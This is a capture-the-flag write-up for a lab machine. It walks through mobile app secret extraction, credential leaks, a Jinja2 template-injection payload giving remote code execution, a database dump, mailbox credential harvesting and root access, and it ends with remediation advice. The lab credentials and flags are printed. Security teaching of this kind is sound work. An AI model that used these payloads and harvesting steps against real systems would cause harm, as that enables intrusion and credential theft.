# Cheezify — Full Boot2Root Writeup

> **Target:** 192.168.10.229  
> **Difficulty:** Medium–Hard  
> **Author:** l27sen  
> **Date:** March 4, 2026  
> **Flags:**  
> - **User:** `VBD{0d9c6a91d9a5d009da0c2df75a832145}`  
> - **Root:** `VBD{29453f51b2b78384de6154f128dc6b03}`

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)  
2. [Phase 1 — Reconnaissance](#2-phase-1--reconnaissance)  
   - 2.1 [Port Scanning](#21-port-scanning)  
   - 2.2 [Service Enumeration](#22-service-enumeration)  
3. [Phase 2 — Web Application Enumeration](#3-phase-2--web-application-enumeration)  
   - 3.1 [Virtual Host Discovery](#31-virtual-host-discovery)  
   - 3.2 [cheezify.vbd — Landing Page & Mobile App Downloads](#32-cheezifyvbd--landing-page--mobile-app-downloads)  
   - 3.3 [app-api.cheezify.vbd — FastAPI REST API](#33-app-apicheezifyvbd--fastapi-rest-api)  
4. [Phase 3 — Mobile Application Analysis](#4-phase-3--mobile-application-analysis)  
   - 4.1 [APK (Android) Analysis](#41-apk-android-analysis)  
   - 4.2 [IPA (iOS) Analysis — Critical Discovery](#42-ipa-ios-analysis--critical-discovery)  
5. [Phase 4 — Exploiting the Dev API](#5-phase-4--exploiting-the-dev-api)  
6. [Phase 5 — Management Panel Access & SSTI to RCE](#6-phase-5--management-panel-access--ssti-to-rce)  
   - 6.1 [Authentication](#61-authentication)  
   - 6.2 [Server-Side Template Injection (SSTI)](#62-server-side-template-injection-ssti)  
   - 6.3 [Remote Code Execution](#63-remote-code-execution)  
7. [Phase 6 — Docker Container Enumeration](#7-phase-6--docker-container-enumeration)  
   - 7.1 [Flask Application Source Code](#71-flask-application-source-code)  
   - 7.2 [Environment Variables — SSH Credentials](#72-environment-variables--ssh-credentials)  
8. [Phase 7 — User Flag](#8-phase-7--user-flag)  
9. [Phase 8 — Privilege Escalation](#9-phase-8--privilege-escalation)  
   - 9.1 [Host Enumeration](#91-host-enumeration)  
   - 9.2 [MongoDB Database Dump](#92-mongodb-database-dump)  
   - 9.3 [Mail Server Exploitation — Manager Credentials](#93-mail-server-exploitation--manager-credentials)  
10. [Phase 9 — Root Flag](#10-phase-9--root-flag)  
11. [Full Attack Chain Diagram](#11-full-attack-chain-diagram)  
12. [Remediation Recommendations](#12-remediation-recommendations)  

---

## 1. Executive Summary

Cheezify is a multi-layered boot2root challenge centered around a fictional cheese-themed food delivery startup. The attack surface spans a microservices architecture hosted on Docker containers behind an Nginx reverse proxy. The exploitation path requires chaining together mobile application reverse engineering, hidden API discovery, Server-Side Template Injection (SSTI), Docker container environment variable leakage, MongoDB enumeration, and internal mail server credential harvesting to achieve full root compromise.

The machine exposes **only two ports** (22/SSH and 80/HTTP), but the HTTP service hides **four distinct virtual hosts**, each serving a different application. The critical path involves extracting hardcoded secrets from an iOS application binary (`.ipa`), using those to access a development API that leaks admin credentials, leveraging those credentials to exploit a Jinja2 SSTI vulnerability for Remote Code Execution inside a Docker container, and ultimately pivoting through internal services (MongoDB and a Dovecot mail server) to escalate privileges from `developer` to `manager` (sudo group) and finally to `root`.

---

## 2. Phase 1 — Reconnaissance

### 2.1 Port Scanning

Initial and full port scans were performed using Nmap to map the attack surface.

```bash
# Initial scan — top ports
nmap -sC -sV -oN nmap_initial_scan 192.168.10.229

# Full port scan — all 65535 ports
nmap -p- -sV 192.168.10.229
```

**Results:**

| Port | Service | Version |
|------|---------|---------|
| 22   | SSH     | OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 |
| 80   | HTTP    | nginx 1.29.5 |

The full 65535-port scan confirmed **no additional ports** were open, making port 80 the primary attack vector.

### 2.2 Service Enumeration

- **OS:** Ubuntu 24.04.2 LTS (Noble Numbat)
- **Kernel:** 6.8.0-101-generic
- **Web Server:** nginx 1.29.5 acting as a reverse proxy
- **Architecture:** Docker-based microservices behind Nginx

---

## 3. Phase 2 — Web Application Enumeration

### 3.1 Virtual Host Discovery

Accessing `http://192.168.10.229` directly returned a default page. Virtual host enumeration was performed using `ffuf`:

```bash
ffuf -u http://192.168.10.229 -H "Host: FUZZ.cheezify.vbd" \
     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -fs 11909
```
> **Note:** This ffuf command gives us nothing

**Discovered Virtual Hosts:**

| Virtual Host | Application | Response Fingerprint |
|---|---|---|
| `cheezify.vbd` | SPA Landing Page (Flutter web) | 11909 bytes (fallback) |
| `app-api.cheezify.vbd` | FastAPI JSON API | 404 = 22 bytes |
| `internal-manage.cheezify.vbd` | Flask/Werkzeug Admin Panel | 404 = 207 bytes |
| `dev-api.cheezify.vbd` | FastAPI Development Notes API | 404 = 22 bytes |

> **Important To Know:** These subdomains results, we gathered them here but actuly we find them seperatly in the next scanns

> **Note:** The first three vhosts were discovered through enumeration and APK analysis. The fourth (`dev-api.cheezify.vbd`) was discovered later through iOS application reverse engineering — a critical turning point in the exploitation chain.

All virtual hosts were added to `/etc/hosts`:

```
192.168.10.229  cheezify.vbd app-api.cheezify.vbd internal-manage.cheezify.vbd dev-api.cheezify.vbd
```

### 3.2 cheezify.vbd — Landing Page & Mobile App Downloads

The main site is a single-page application (SPA) built with Flutter for web. It serves as a marketing landing page for the Cheezify food delivery service.

**Key findings:**
- Download links for both **APK** (Android) and **IPA** (iOS) mobile applications
- Static assets served from Flutter's asset pipeline
- No server-side functionality beyond serving static content

Both mobile applications were downloaded for offline analysis:

```bash
wget http://cheezify.vbd/cheezify.apk
wget http://cheezify.vbd/cheezify.ipa
```

### 3.3 app-api.cheezify.vbd — FastAPI REST API

The main API is a FastAPI application with full OpenAPI/Swagger documentation available at `/docs`.

**Authentication:** OAuth2 Password Flow with HS256 JWT tokens.

**Endpoints discovered (14 total):**

| Method | Path | Description |
|---|---|---|
| `POST` | `/auth/register` | Register new user |
| `POST` | `/auth/login` | JWT token login |
| `GET` | `/auth/me` | Current user profile |
| `PUT` | `/auth/me` | Update profile |
| `GET` | `/items/` | List menu items |
| `GET` | `/items/{id}` | Get specific item |
| `POST` | `/items/favorites/{id}` | Add to favorites |
| `DELETE` | `/items/favorites/{id}` | Remove from favorites |
| `POST` | `/orders/` | Place an order |
| `GET` | `/orders/` | List user orders |
| `GET` | `/orders/{id}` | Get specific order |
| `GET` | `/cheezify` | Cheezify endpoint |

**Extensive testing was performed on this API:**
- **User enumeration:** Confirmed existing user `cheese.lover@cheezify.vbd` via registration endpoint (different error messages for existing vs. new emails)
- **IDOR testing:** All endpoints properly scope data to the authenticated user — no horizontal privilege escalation possible
- **NoSQL injection:** Tested on login and all query endpoints — properly parameterized
- **Mass assignment:** Attempted to set `role`, `is_admin`, `is_staff` fields on registration/update — all rejected by Pydantic validation
- **JWT cracking:** Created a 120,000+ entry wordlist combining cheese themes, common secrets, and hashcat masks. HS256 secret was **not crackable** — this is a dead end by design
- **Email normalization bug:** Discovered that `CHEESE.LOVER@cheezify.vbd` creates a separate account due to case-sensitive handling, but this doesn't help access the original user's data

---

## 4. Phase 3 — Mobile Application Analysis

### 4.1 APK (Android) Analysis

The APK was extracted and decompiled for analysis:

```bash
mkdir apk_extracted-2 && cd apk_extracted-2
apktool d ../cheezify.apk -o .
```

**Key finding in `AndroidManifest.xml`:**

```xml
<meta-data
    android:name="internal_manage_endpoint"
    android:value="http://internal-manage.cheezify.vbd"/>
```

This metadata tag revealed the existence of the **third virtual host** — the internal management panel at `internal-manage.cheezify.vbd`.

**Additional analysis:**
- String dumps from the Flutter `libapp.so` binary (`libapp_strings.txt`) — no additional secrets beyond known URLs
- Flutter asset manifests — only images and font references
- Kotlin metadata — standard library references

The APK analysis provided the management panel URL but no credentials to access it.

### 4.2 IPA (iOS) Analysis — Critical Discovery

The IPA file (8.9MB iOS application bundle) proved to be the **pivotal breakthrough** in the entire challenge.

```bash
mkdir ipa_extracted && cd ipa_extracted
unzip ../cheezify.ipa
```

The IPA structure revealed a standard Flutter iOS application:

```
Payload/
└── Runner.app/
    ├── Info.plist          ← Contains hardcoded secrets!
    ├── Frameworks/
    │   ├── App.framework/
    │   ├── Flutter.framework/
    │   └── ...
    └── ...
```

**Examining `Info.plist`:**

```bash
cat Payload/Runner.app/Info.plist
```

The binary plist contained **two critical hardcoded secrets**:

| Key | Value |
|---|---|
| `DevApiEndpoint` | `http://dev-api.cheezify.vbd` |
| `DevApiKey` | `9fbd8369cb8393671178ce7d85ce025b` |

This revealed:
1. A **fourth virtual host** (`dev-api.cheezify.vbd`) that was not discoverable through standard web enumeration
2. An **API key** for authenticating to this hidden development API

> **Lesson:** Always analyze both APK and IPA artifacts. Developers often leave different debugging/development configurations in iOS vs. Android builds. The iOS `Info.plist` contained secrets that were absent from the Android `AndroidManifest.xml`.

---

## 5. Phase 4 — Exploiting the Dev API

With the discovered endpoint and API key, the development API was explored:

```bash
curl -s -H "Host: dev-api.cheezify.vbd" http://192.168.10.229/docs
```

The dev API is another FastAPI application with Swagger UI, protected by an `X-API-Key` header.

**Endpoints:**

| Method | Path | Description |
|---|---|---|
| `GET` | `/notes/` | Retrieve developer notes |
| `POST` | `/notes/?note=...` | Add a note |
| `GET` | `/projects/status` | Project status |
| `GET` | `/projects/info` | Project information |

**Accessing the `/notes/` endpoint:**

```bash
curl -s -H "Host: dev-api.cheezify.vbd" \
     -H "X-API-Key: 9fbd8369cb8393671178ce7d85ce025b" \
     http://192.168.10.229/notes/
```

**Response:**

```json
{
  "notes": [
    "Cheezify API is under active development.",
    "Remember to use the X-API-Key header for all requests.",
    "The backend is currently migrating to a new database schema.",
    "Change the credentials for internal.",
    "Credentials : admin@cheezify.vbd:Cheez1fyF00ds@456"
  ]
}
```

The developer notes contained **plaintext admin credentials** for the internal management panel:

| Field | Value |
|---|---|
| **Email** | `admin@cheezify.vbd` |
| **Password** | `Cheez1fyF00ds@456` |

---

## 6. Phase 5 — Management Panel Access & SSTI to RCE

### 6.1 Authentication

The internal management panel at `http://internal-manage.cheezify.vbd` is a Flask/Werkzeug application presenting a login form.

```bash
curl -s -X POST \
     -H "Host: internal-manage.cheezify.vbd" \
     -d "email=admin@cheezify.vbd&password=Cheez1fyF00ds@456" \
     http://192.168.10.229/login -v
```

**Response:** HTTP 302 redirect to `/` with `Set-Cookie: token=eyJ...` — a JWT session cookie signed with the Flask `SECRET_KEY`.

After authentication, the dashboard reveals:
- An **"Add New Item"** form with fields: name, price, image URL, description
- A table displaying existing menu items
- Delete functionality for items

### 6.2 Server-Side Template Injection (SSTI)

Testing the item name field for SSTI:

```bash
# Add item with SSTI payload
curl -s -b "token=$MGMT_TOKEN" \
     -H "Host: internal-manage.cheezify.vbd" \
     --data-urlencode "name={{7*7}}" \
     --data-urlencode "price=1" \
     --data-urlencode "description=test" \
     http://192.168.10.229/add
```

Upon viewing the dashboard, the item name rendered as **`49`** instead of `{{7*7}}`, confirming **Jinja2 Server-Side Template Injection**.

**Root cause (discovered later via source code):**

```python
# In app.py — the vulnerable line
render_template_string(item['name'])  # Unsanitized user input passed to template engine
```

The application uses `render_template_string()` on user-controlled item names, allowing arbitrary Jinja2 template execution.

### 6.3 Remote Code Execution

Escalating from SSTI to RCE:

```bash
# RCE via Jinja2 SSTI
PAYLOAD="{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"

curl -s -b "token=$MGMT_TOKEN" \
     -H "Host: internal-manage.cheezify.vbd" \
     --data-urlencode "name=$PAYLOAD" \
     --data-urlencode "price=1" \
     --data-urlencode "description=rce" \
     http://192.168.10.229/add
```

**Rendered output on dashboard:**

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

RCE confirmed as `www-data` inside a Docker container.

> **Technique:** For commands producing multi-line output, the output was piped through `| base64 -w0` to avoid HTML rendering issues, then decoded locally.

---

## 7. Phase 6 — Docker Container Enumeration

### 7.1 Flask Application Source Code

Using the RCE, the full Flask application source was exfiltrated:

```bash
PAYLOAD="{{request.application.__globals__.__builtins__.__import__('os').popen('cat /app/app.py | base64 -w0').read()}}"
```

**Key details from `/app/app.py`:**

```python
SECRET_KEY = 'b3st-ch33s3-1n-t0wn'
MONGODB_URL = 'mongodb://mongodb:27017/cheezify'
INTERNAL_MONGO_URL = 'mongodb://mongodb:27017/secretdb'
```

The application uses:
- **Two MongoDB databases:** `cheezify` (menu items) and `secretdb` (admin user authentication)
- **JWT-based session cookies** signed with the `SECRET_KEY`
- **Plaintext password** comparison for admin login against `secretdb.users`
- **`render_template_string()`** on item names — the intentional SSTI vulnerability

### 7.2 Environment Variables — SSH Credentials

Dumping container environment variables via SSTI:

```bash
PAYLOAD="{{request.application.__globals__.__builtins__.__import__('os').popen('env | base64 -w0').read()}}"
```

**Critical environment variables found:**

| Variable | Value |
|---|---|
| `USER` | `developer` |
| `PASSWORD` | `CheezifyDev2026!123` |
| `HOSTNAME` | `39366f79c7c3` |
| `SECRET_KEY` | `b3st-ch33s3-1n-t0wn` |

The `USER` and `PASSWORD` environment variables are **SSH credentials** for the host system.

---

## 8. Phase 7 — User Flag

With the discovered SSH credentials:

```bash
ssh developer@192.168.10.229
# Password: CheezifyDev2026!123
```

```bash
developer@cheezify:~$ id
uid=1001(developer) gid=1001(developer) groups=1001(developer)

developer@cheezify:~$ cat ~/user.txt
VBD{0d9c6a91d9a5d009da0c2df75a832145}
```

### **User Flag: `VBD{0d9c6a91d9a5d009da0c2df75a832145}`**

---

## 9. Phase 8 — Privilege Escalation

### 9.1 Host Enumeration

Standard Linux privilege escalation checks:

```bash
# Sudo check
developer@cheezify:~$ sudo -l
# → "developer is not in the sudoers file"

# SUID binaries
developer@cheezify:~$ find / -perm -4000 -type f 2>/dev/null
# → All standard binaries (sudo, mount, passwd, etc.) — nothing unusual

# Linux capabilities
developer@cheezify:~$ getcap -r / 2>/dev/null
# → Only standard capabilities (ping, mtr-packet, gst-ptp-helper)

# User enumeration
developer@cheezify:~$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
manager:x:1000:1000:cheezify:/home/manager:/bin/bash
developer:x:1001:1001::/home/developer:/bin/bash
```

**Critical finding — the `manager` user is in the `sudo` group:**

```bash
developer@cheezify:~$ cat /etc/group | grep -E "sudo|manager"
sudo:x:27:manager
manager:x:1000:
```

The escalation path is clear: **developer → manager → sudo → root**. But manager's password is needed.

**Docker architecture discovered via `ps aux`:**

The host runs 7 Docker containers:
1. **Nginx** (reverse proxy) — `172.18.0.3:80`
2. **FastAPI** (main API) — uvicorn on port 8000
3. **Flask** (management panel) — flask on port 5000
4. **MongoDB** — `172.18.0.4:27017`
5. **FastAPI** (dev API) — uvicorn on port 8080
6. **Apache/Postfix/Dovecot** (mail server) — `172.18.0.8`
7. **Supervisord container** — running Postfix, Dovecot, amavisd, cron, rsyslog

### 9.2 MongoDB Database Dump

Using the SSTI RCE from the Flask container (which has `pymongo` installed and direct access to MongoDB), a complete database dump was performed:

```python
# Python script executed via SSTI (base64-encoded and piped to python3)
import pymongo
c = pymongo.MongoClient("mongodb://mongodb:27017")
for db in c.list_database_names():
    print(f"DB: {db}")
    for col in c[db].list_collection_names():
        print(f"  COL: {col}")
        for doc in c[db][col].find():
            print(f"    {doc}")
```

**Databases found:** `admin`, `cheezify`, `config`, `local`, `secretdb`

**Key finding in `secretdb.users`:**

| Email | Password | Role | Status |
|---|---|---|---|
| `admin@cheezify.vbd` | `Cheez1fyF00ds@456` | admin | active |
| `dev-ops@cheezify.vbd` | `D3vopsCheezify789` | devops | **revoked** |

The `dev-ops` account is marked as "revoked" in the management panel, but the **password may still be valid for other services**.

### 9.3 Mail Server Exploitation — Manager Credentials

The mail server container (`172.18.0.8`) was identified running:
- **Postfix** (SMTP on port 25)
- **Dovecot** (IMAP on port 143)
- **amavisd** (mail filtering)
- **OpenDKIM / OpenDMARC**

Using the devops credentials to access the IMAP mailbox:

```python
import imaplib

m = imaplib.IMAP4("172.18.0.8", 143)
m.login("dev-ops@cheezify.vbd", "D3vopsCheezify789")
m.select("INBOX")
typ, data = m.search(None, "ALL")

for num in data[0].split():
    typ, msg = m.fetch(num, "(RFC822)")
    print(msg[0][1].decode())
```

**Four emails found in the dev-ops inbox:**

| # | From | Subject | Content |
|---|---|---|---|
| 1 | `security-audit@cheezify.vbd` | Firewall Rule Update | Request to restrict MongoDB port 27017 access |
| 2 | **`manager@cheezify.vbd`** | **Re: App Deployment Status** | **Contains manager credentials!** |
| 3 | `support@cheezify.vbd` | Image Upload Issues | Request to check Nginx `client_max_body_size` |
| 4 | `dev-ops@cheezify.vbd` | Nightly Backup Log | Backup status report |

**The critical email (Email #2):**

```
From: manager@cheezify.vbd
To: dev-ops@cheezify.vbd
Subject: Re: App Deployment Status

Hi DevOps Team,

If you ever need the manager privilege for doing the tasks you can use the 
following credentials:

Username: manager
Password: Ch33z1fyManag3r789

Regards,
Manager
```

---

## 10. Phase 9 — Root Flag

### SSH as Manager

```bash
ssh manager@192.168.10.229
# Password: Ch33z1fyManag3r789
```

```bash
manager@cheezify:~$ id
uid=1000(manager) gid=1000(manager) groups=1000(manager),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),101(lxd)
```

### Sudo Escalation to Root

```bash
manager@cheezify:~$ sudo cat /root/root.txt
[sudo] password for manager: Ch33z1fyManag3r789

VBD{29453f51b2b78384de6154f128dc6b03}
```

### **Root Flag: `VBD{29453f51b2b78384de6154f128dc6b03}`**

---

## 11. Full Attack Chain Diagram

```
┌──────────────────────────────────────────────────────────────────┐
│                    CHEEZIFY — ATTACK CHAIN                       │
└──────────────────────────────────────────────────────────────────┘

   ┌─────────────┐
   │  Nmap Scan  │  Ports 22 (SSH) + 80 (HTTP/Nginx)
   └──────┬──────┘
          │
          ▼
   ┌──────────────────┐
   │  VHost Discovery │  cheezify.vbd, app-api.cheezify.vbd,
   │  (ffuf)          │  internal-manage.cheezify.vbd
   └──────┬───────────┘
          │
          ▼
   ┌──────────────────────┐
   │  Download APK + IPA  │  From cheezify.vbd landing page
   └──────┬───────────────┘
          │
          ├──► APK Analysis ──► AndroidManifest.xml
          │                      └─► internal-manage.cheezify.vbd (already known)
          │
          ▼
   ┌───────────────────────────────────────┐
   │  IPA Analysis (Info.plist)            │  ★ CRITICAL ★
   │  DevApiEndpoint: dev-api.cheezify.vbd │
   │  DevApiKey: 9fbd8369cb8393671178ce... │
   └──────┬────────────────────────────────┘
          │
          ▼
   ┌────────────────────────────┐
   │  Dev API /notes/ Endpoint  │  X-API-Key authentication
   │  Leaks admin credentials   │
   │  admin@cheezify.vbd        │
   │  Cheez1fyF00ds@456         │
   └──────┬─────────────────────┘
          │
          ▼
   ┌────────────────────────────────────┐
   │  Management Panel Login            │  internal-manage.cheezify.vbd
   │  Flask/Werkzeug application        │
   └──────┬─────────────────────────────┘
          │
          ▼
   ┌────────────────────────────────────┐
   │  SSTI in Item Name Field           │  {{7*7}} → 49
   │  Jinja2 render_template_string()   │
   └──────┬─────────────────────────────┘
          │
          ▼
   ┌────────────────────────────────────┐
   │  RCE as www-data (Docker)          │
   │  Container: 39366f79c7c3           │
   └──────┬─────────────────────────────┘
          │
          ├──► cat /app/app.py    → Flask source + MongoDB URLs
          ├──► env                → USER=developer, PASSWORD=CheezifyDev2026!123
          │
          ▼
   ┌────────────────────────────────────┐
   │  SSH as developer                  │  developer:CheezifyDev2026!123
   │  ★ USER FLAG ★                    │
   │  VBD{0d9c6a91d9a5d009da0c2df75a... │
   └──────┬─────────────────────────────┘
          │
          ├──► sudo -l           → Not in sudoers
          ├──► SUID binaries     → All standard
          ├──► manager in sudo   → Need manager's password
          │
          ▼
   ┌────────────────────────────────────┐
   │  MongoDB Dump (via SSTI RCE)       │
   │  secretdb.users → dev-ops creds    │
   │  dev-ops@cheezify.vbd              │
   │  D3vopsCheezify789                 │
   └──────┬─────────────────────────────┘
          │
          ▼
   ┌────────────────────────────────────┐
   │  IMAP Login (172.18.0.8:143)       │
   │  dev-ops mailbox → 4 emails        │
   │  Email from manager contains:      │
   │  manager:Ch33z1fyManag3r789        │
   └──────┬─────────────────────────────┘
          │
          ▼
   ┌────────────────────────────────────┐
   │  SSH as manager → sudo → root      │
   │  ★ ROOT FLAG ★                    │
   │  VBD{29453f51b2b78384de6154f128... │
   └────────────────────────────────────┘
```

---

## 12. Remediation Recommendations

### Critical

| # | Vulnerability | Remediation |
|---|---|---|
| 1 | **Hardcoded API key and endpoint in iOS Info.plist** | Move secrets to a secure backend configuration service. Never ship API keys or development endpoints in client-side binaries. Use build-time environment substitution for different build flavors (dev/staging/prod). |
| 2 | **Plaintext credentials in developer notes API** | Remove all credentials from developer notes. Use a secrets manager (e.g., HashiCorp Vault, AWS Secrets Manager). Implement credential rotation policies. |
| 3 | **Server-Side Template Injection (SSTI)** | Never pass user-controlled input to `render_template_string()`. Use `render_template()` with parameterized variables. Implement input sanitization and content security policies. |
| 4 | **Plaintext passwords in MongoDB** | Hash all passwords using bcrypt or Argon2. The main API correctly uses bcrypt—apply the same standard to the management panel's `secretdb`. |
| 5 | **Credentials in Docker environment variables** | Use Docker Secrets or a mounted secrets file instead of environment variables. Environment variables are visible via `/proc/*/environ` and `docker inspect`. |
| 6 | **Plaintext credentials in email** | Implement a secure credential distribution mechanism. Use a password manager with secure sharing. Enforce email encryption (S/MIME or PGP) for sensitive communications. |

### High

| # | Vulnerability | Remediation |
|---|---|---|
| 7 | **Hidden vhost `internal_manage_endpoint` in APK metadata** | Do not reference internal infrastructure in mobile app manifests. Use feature flags and remote configuration instead of hardcoded internal URLs. |
| 8 | **MongoDB accessible without authentication** | Enable MongoDB authentication. Restrict network access to MongoDB using Docker network policies. Implement TLS for database connections. |
| 9 | **Mail server credentials reused from revoked account** | When revoking accounts, change passwords across all services. Implement centralized identity management (LDAP/Active Directory). |
| 10 | **User enumeration via API registration** | Return generic error messages for both existing and non-existing emails during registration. Implement rate limiting on registration and login endpoints. |

### Medium

| # | Vulnerability | Remediation |
|---|---|---|
| 11 | **Email case normalization inconsistency** | Normalize email addresses to lowercase before storage and comparison. |
| 12 | **Docker socket accessible on host** | Restrict Docker socket permissions. Consider using rootless Docker or Podman for improved security isolation. |
| 13 | **Internal services on shared Docker network** | Implement Docker network segmentation — the mail server, databases, and application containers should be on separate networks with explicit allowed traffic flows. |

---
